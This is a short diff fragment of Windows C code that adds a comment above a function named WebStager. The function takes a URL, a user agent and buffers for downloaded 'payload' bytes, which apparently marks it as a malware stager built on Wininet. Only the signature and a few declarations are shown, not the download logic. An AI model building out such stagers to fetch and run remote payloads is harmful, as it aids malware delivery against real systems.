@@ -4,6 +4,7 @@
 
 #pragma comment (lib, "Wininet.lib")
 
+// WebStager function
 BOOL WebStager(LPCWSTR szUrl, LPCWSTR szUserAgent, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
     BOOL bSTATE = TRUE;
     HINTERNET hInternet = NULL, hInternetFile = NULL;
